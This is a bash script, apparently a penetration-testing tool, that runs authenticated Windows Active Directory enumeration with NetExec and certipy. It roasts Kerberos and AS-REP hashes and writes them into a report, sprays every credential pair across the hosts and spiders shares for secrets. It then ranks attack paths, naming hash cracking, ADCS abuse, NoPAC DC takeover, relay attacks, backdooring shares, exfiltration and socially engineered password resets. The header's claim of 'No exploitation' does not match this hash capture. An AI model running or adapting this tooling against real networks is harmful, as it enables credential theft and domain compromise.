#!/usr/bin/env bash
# ============================================================================
# post_auth_enum.sh — Authenticated Windows/AD Enumeration
# ============================================================================
# All output → ONE .md file. 20s timeout per call. No exploitation.
# Usage: ./post_auth_enum.sh [--hosts winhosts.txt] [--users user1.txt]
#                             [--passwords passwords1.txt] [--domain WORMHOLE]
# ============================================================================
set -euo pipefail

HOSTS_FILE="winhosts.txt"
USERS_FILE="user1.txt"
PASSWORDS_FILE="passwords1.txt"
DOMAIN=""
T=20
OUT="post_auth_results_$(date +%Y%m%d_%H%M%S).md"

while [[ $# -gt 0 ]]; do
    case "$1" in
        --hosts)      HOSTS_FILE="$2"; shift 2 ;;
        --users)      USERS_FILE="$2"; shift 2 ;;
        --passwords)  PASSWORDS_FILE="$2"; shift 2 ;;
        --domain)     DOMAIN="$2"; shift 2 ;;
        --out)        OUT="$2"; shift 2 ;;
        -h|--help) echo "Usage: $0 --hosts FILE --users FILE --passwords FILE [--domain DOM]"; exit 0 ;;
        *) echo "Unknown: $1"; exit 1 ;;
    esac
done

for f in "$HOSTS_FILE" "$USERS_FILE" "$PASSWORDS_FILE"; do
    [[ ! -f "$f" ]] && echo "[!] Not found: $f" && exit 1
done

HOST_COUNT=$(grep -cvE '^\s*#|^\s*$' "$HOSTS_FILE")
TARGETS=$(grep -vE '^\s*#|^\s*$' "$HOSTS_FILE" | tr -d '\r' | tr '\n' ' ')

mapfile -t USERNAMES < <(grep -vE '^\s*#|^\s*$' "$USERS_FILE" | tr -d '\r')
mapfile -t PASSWORDS < <(grep -vE '^\s*#|^\s*$' "$PASSWORDS_FILE" | tr -d '\r')
CRED_COUNT=${#USERNAMES[@]}
[[ $CRED_COUNT -eq 0 ]] && echo "[!] No credentials" && exit 1

U="${USERNAMES[0]}"
P="${PASSWORDS[0]}"
D_FLAG=""
[[ -n "$DOMAIN" ]] && D_FLAG="-d $DOMAIN"

cat > "$OUT" << EOF
# Post-Auth Enumeration Results
**Date:** $(date)
**Hosts:** $HOST_COUNT ($TARGETS)
**Primary cred:** $U | **Domain:** ${DOMAIN:-auto}
**Cred pairs:** $CRED_COUNT | **Timeout:** ${T}s per call

---

EOF

r() {
    local label="$1"; shift
    echo "  [*] $label"
    printf '## %s\n```\n' "$label" >> "$OUT"
    timeout "$T" "$@" >> "$OUT" 2>&1 && true
    local rc=$?
    [[ $rc -eq 124 ]] && printf '\n(TIMEOUT after %ds)\n' "$T" >> "$OUT"
    [[ $rc -ne 0 && $rc -ne 124 ]] && printf '\n(exit %d)\n' "$rc" >> "$OUT"
    printf '```\n\n---\n\n' >> "$OUT"
    return 0
}

# ── SMB Authenticated ─────────────────────────────────────────────────
echo -e "\n[+] SMB Authenticated"
r "Shares + RID Brute + Disks"     nxc smb $TARGETS -u "$U" -p "$P" $D_FLAG --shares --rid-brute --disks
r "Sessions + Logged-on Users"     nxc smb $TARGETS -u "$U" -p "$P" $D_FLAG --sessions --loggedon-users
r "Local Groups"                   nxc smb $TARGETS -u "$U" -p "$P" $D_FLAG --local-group
r "AV / EDR Detection"            nxc smb $TARGETS -u "$U" -p "$P" $D_FLAG -M enum_av

# ── LDAP Authenticated ────────────────────────────────────────────────
echo -e "\n[+] LDAP Authenticated"
r "Users + Groups + Delegation + Admin Count"  nxc ldap $TARGETS -u "$U" -p "$P" $D_FLAG --users --groups --trusted-for-delegation --admin-count
r "Delegation Detail"              nxc ldap $TARGETS -u "$U" -p "$P" $D_FLAG --find-delegation
r "DC List"                        nxc ldap $TARGETS -u "$U" -p "$P" $D_FLAG --dc-list
r "Domain SID"                     nxc ldap $TARGETS -u "$U" -p "$P" $D_FLAG --get-sid

# ── Kerberos ──────────────────────────────────────────────────────────
echo -e "\n[+] Kerberos"
r "Kerberoast"                     nxc ldap $TARGETS -u "$U" -p "$P" $D_FLAG --kerberoasting /tmp/kerb_hashes.txt
r "ASREPRoast (auth)"              nxc ldap $TARGETS -u "$U" -p "$P" $D_FLAG --asreproast /tmp/asrep_auth_hashes.txt

for HFILE in /tmp/kerb_hashes.txt /tmp/asrep_auth_hashes.txt; do
    if [[ -f "$HFILE" && -s "$HFILE" ]]; then
        printf '## %s\n```\n' "$(basename "$HFILE" .txt) — CAPTURED" >> "$OUT"
        cat "$HFILE" >> "$OUT"
        printf '\n```\n\n---\n\n' >> "$OUT"
    fi
done

# ── NTLMv1 Check ──────────────────────────────────────────────────────
echo -e "\n[+] NTLMv1"
r "NTLMv1 Check"                   nxc smb $TARGETS -u "$U" -p "$P" $D_FLAG --ntlmv1

# ── LDAP Modules (high value) ─────────────────────────────────────────
echo -e "\n[+] LDAP Modules"
r "Passwords in Descriptions"     nxc ldap $TARGETS -u "$U" -p "$P" $D_FLAG -M get-desc-users -o PASSWORDPOLICY=true
r "ADCS"                          nxc ldap $TARGETS -u "$U" -p "$P" $D_FLAG -M adcs
r "Machine Account Quota"         nxc ldap $TARGETS -u "$U" -p "$P" $D_FLAG -M maq

# ── SMB Modules ───────────────────────────────────────────────────────
echo -e "\n[+] SMB Modules"
r "NoPAC Check"                   nxc smb $TARGETS -u "$U" -p "$P" $D_FLAG -M nopac
r "Coerce Check"                  nxc smb $TARGETS -u "$U" -p "$P" $D_FLAG -M coerce_plus

# ── ADCS Templates (certipy) ─────────────────────────────────────────
echo -e "\n[+] ADCS Templates"
if command -v certipy &>/dev/null; then
    PRINCIPAL="$U"
    [[ -n "$DOMAIN" ]] && PRINCIPAL="${U}@${DOMAIN}"
    for HOST in $(grep -vE '^\s*#|^\s*$' "$HOSTS_FILE" | tr -d '\r'); do
        r "Certipy Vulnerable Templates — $HOST"  certipy find -u "$PRINCIPAL" -p "$P" -dc-ip "$HOST" -vulnerable -stdout
    done
else
    printf '## ADCS Templates\ncertipy not installed — skipping\n\n---\n\n' >> "$OUT"
    echo "  [!] certipy not installed — skipping"
fi

# ── LDAP Queries (force-change, LAPS, overprivileged) ─────────────────
echo -e "\n[+] LDAP Queries"
r "Force Change Password (pwdLastSet=0)"  nxc ldap $TARGETS -u "$U" -p "$P" $D_FLAG --query "(pwdLastSet=0)" "sAMAccountName pwdLastSet userAccountControl"
r "Password-Not-Required Flag"    nxc ldap $TARGETS -u "$U" -p "$P" $D_FLAG --password-not-required
r "SPN Accounts"                  nxc ldap $TARGETS -u "$U" -p "$P" $D_FLAG --query "(servicePrincipalName=*)" "sAMAccountName servicePrincipalName"
r "LAPS Check"                    nxc ldap $TARGETS -u "$U" -p "$P" $D_FLAG --query "(ms-Mcs-AdmPwdExpirationTime=*)" "sAMAccountName"
r "Computers + OS"                nxc ldap $TARGETS -u "$U" -p "$P" $D_FLAG --query "(objectClass=computer)" "sAMAccountName operatingSystem"
r "Backup Operators / Privileged Groups"  nxc ldap $TARGETS -u "$U" -p "$P" $D_FLAG --query "(&(objectClass=group)(|(cn=Backup Operators)(cn=Account Operators)(cn=Server Operators)(cn=DnsAdmins)))" "cn member"

# ── Access Mapping (all creds, parallel) ──────────────────────────────
echo -e "\n[+] Access Mapping"
printf '## Access Mapping (all creds)\n```\n' >> "$OUT"
for i in "${!USERNAMES[@]}"; do
    CU="${USERNAMES[$i]}"
    CP="${PASSWORDS[$i]:-${PASSWORDS[-1]}}"
    timeout "$T" nxc smb $TARGETS -u "$CU" -p "$CP" $D_FLAG > "/tmp/access_${CU}.txt" 2>&1 &
done
wait
for i in "${!USERNAMES[@]}"; do
    CU="${USERNAMES[$i]}"
    printf '\n--- %s ---\n' "$CU" >> "$OUT"
    [[ -f "/tmp/access_${CU}.txt" ]] && cat "/tmp/access_${CU}.txt" >> "$OUT"
done
printf '\n```\n\n---\n\n' >> "$OUT"
echo "  [*] All $CRED_COUNT creds checked"

# ── MSSQL + FTP ───────────────────────────────────────────────────────
echo -e "\n[+] MSSQL / FTP"
r "MSSQL Auth"                    nxc mssql $TARGETS -u "$U" -p "$P" $D_FLAG
r "FTP Anonymous"                 nxc ftp $TARGETS -u 'anonymous' -p '' --ls

# ── Share Spider (file listing + PII grep) ────────────────────────────
echo -e "\n[+] Share Spider"
printf '## Share Spider (file listing)\n```\n' >> "$OUT"
echo "  [*] Spider (30s timeout)"
timeout 30 nxc smb $TARGETS -u "$U" -p "$P" $D_FLAG -M spider_plus >> "$OUT" 2>&1 && true
[[ $? -eq 124 ]] && printf '\n(TIMEOUT after 30s)\n' >> "$OUT"
printf '\n```\n\n---\n\n' >> "$OUT"

# ============================================================================
# ATTACK PATH SCORING
# ============================================================================
printf '\n# Attack Path Summary\n\n' >> "$OUT"
N=0
add() { N=$((N+1)); printf '**%d. [%s] %s**\n%s\n\n' "$N" "$1" "$2" "$3" >> "$OUT"; }

# Kerberoast
[[ -f /tmp/kerb_hashes.txt && -s /tmp/kerb_hashes.txt ]] && {
    KC=$(wc -l < /tmp/kerb_hashes.txt)
    add "HIGH" "Kerberoasting — $KC account(s)" "TGS hashes extracted. \`hashcat -m 13100\`"
}

# ASREPRoast
[[ -f /tmp/asrep_auth_hashes.txt && -s /tmp/asrep_auth_hashes.txt ]] && {
    AC=$(wc -l < /tmp/asrep_auth_hashes.txt)
    add "HIGH" "AS-REP Roasting — $AC account(s)" "Hashes captured. \`hashcat -m 18200\`"
}

# Passwords in descriptions
grep -A20 "Passwords in Descriptions" "$OUT" | grep -qiE 'pass|pwd|cred|secret' 2>/dev/null && \
    add "HIGH" "Passwords in Descriptions" "Credential-like strings in user description fields."

# PII in shares
grep -A50 "Share Spider" "$OUT" | grep -qiE 'password|credential|ssn|social|secret|\.kdbx|\.key|id_rsa|\.pfx|\.pem' 2>/dev/null && \
    add "HIGH" "Sensitive Files in Shares" "PII or credential files found in readable shares."

# Writable shares
grep -A30 "Shares + RID" "$OUT" | grep -qiE 'WRITE' 2>/dev/null && \
    add "HIGH" "Writable Shares" "Authenticated user has WRITE on shares."

# NTLMv1
grep -A10 "NTLMv1 Check" "$OUT" | grep -qiE "True\|enabled\|NTLMv1" 2>/dev/null && \
    add "CRIT" "NTLMv1 Enabled" "DC still has NTLMv1. Downgrade + crack for NTLM hash."

# Force change password
grep -A20 "Force Change Password" "$OUT" | grep -qiE "sAMAccountName" 2>/dev/null && \
    add "HIGH" "Force Change Password" "Users with pwdLastSet=0 — must change password at next logon."

# Password not required
grep -A10 "Password-Not-Required" "$OUT" | grep -qiE "\[\+\]" 2>/dev/null && \
    add "HIGH" "PASSWD_NOTREQD Flag" "Accounts with UF_PASSWD_NOTREQD — may have blank passwords."

# Backup operators / privileged
grep -A20 "Backup Operators" "$OUT" | grep -qiE "member" 2>/dev/null && \
    add "MEDIUM" "Overprivileged Groups" "Non-default members in Backup Operators/Account Operators/DnsAdmins. Check for intern/service accounts."

for HOST in $(grep -vE '^\s*#|^\s*$' "$HOSTS_FILE" | tr -d '\r'); do
    # ADCS ESC
    if grep -qi "certipy" "$OUT" 2>/dev/null; then
        for ESC in ESC1 ESC2 ESC3 ESC4 ESC5 ESC6 ESC7 ESC8 ESC9; do
            grep -qi "$ESC" "$OUT" 2>/dev/null && \
                add "HIGH" "ADCS $ESC — $HOST" "Template misconfiguration confirmed by certipy."
        done
    fi

    # NoPAC
    grep -A10 "NoPAC" "$OUT" | grep -qiE "VULN" 2>/dev/null && \
        add "CRIT" "NoPAC — $HOST" "DC susceptible. Needs MAQ > 0."

    # Coercion (auth)
    grep -A10 "Coerce Check" "$OUT" | grep -qiE "VULN\|\[\+\]" 2>/dev/null && \
        add "HIGH" "Coercion (auth) — $HOST" "PetitPotam/EFSRpc confirmed. KrbRelayUp path if MAQ > 0."

    # Delegation
    grep -A20 "Delegation Detail" "$OUT" | grep -qiE "Unconstrained" 2>/dev/null && \
        add "HIGH" "Unconstrained Delegation — $HOST" "Can capture TGTs."

    grep -A20 "Delegation Detail" "$OUT" | grep -qiE "Constrained" 2>/dev/null && \
        add "HIGH" "Constrained Delegation — $HOST" "S4U2Self/S4U2Proxy abuse. Check who can CD to where."

    # Local admin
    for i in "${!USERNAMES[@]}"; do
        CU="${USERNAMES[$i]}"
        [[ -f "/tmp/access_${CU}.txt" ]] && grep -qiE "Pwn3d" "/tmp/access_${CU}.txt" 2>/dev/null && \
            add "HIGH" "Local Admin — ${CU}" "Pwn3d confirmed. Pivot point."
    done

    # MSSQL
    grep -A10 "MSSQL Auth" "$OUT" | grep -qiE "\[\+\]" 2>/dev/null && \
        add "MEDIUM" "MSSQL — $HOST" "Auth succeeded. Check impersonation/linked servers."

    # FTP anon
    grep -A10 "FTP Anonymous" "$OUT" | grep -qiE "\[\+\]" 2>/dev/null && \
        add "HIGH" "Anonymous FTP — $HOST" "Directory listing with anonymous login."
done

# MAQ (outside per-host loop since it's domain-wide)
grep -A5 "Machine Account Quota" "$OUT" | grep -qE "MachineAccountQuota:.*[1-9]" 2>/dev/null && \
    add "MEDIUM" "MAQ > 0" "Machine account creation → RBCD/NoPAC/KrbRelayUp."

# AV/EDR
grep -A10 "AV / EDR" "$OUT" | grep -qiE 'Defender|ESET|Sophos|CrowdStrike|Carbon|Sentinel|Symantec|McAfee' 2>/dev/null && \
    add "INFO" "Endpoint Protection" "$(grep -A10 "AV / EDR" "$OUT" | grep -ioE 'Windows Defender|ESET|Sophos|CrowdStrike|SentinelOne|Carbon Black|Symantec|McAfee' 2>/dev/null | sort -u | head -5 | tr '\n' ', ')"

cat >> "$OUT" << EOF

---

**Total findings: $N** | $(date)

## Priority
1. NTLMv1 → downgrade + crack for domain hash
2. Kerberoast/ASREPRoast → crack offline now
3. ADCS ESC paths → domain compromise
4. NoPAC + MAQ → DC takeover
5. Coercion + signing off → KrbRelayUp
6. Passwords in descriptions → immediate cred use
7. Constrained delegation → S4U abuse
8. Writable shares / PII → backdoor or exfil
9. Force change password → social engineer password reset
10. Local admin → pivot
EOF

echo -e "\n============================================================"
echo "  Done — $N findings → $OUT"
echo "============================================================"
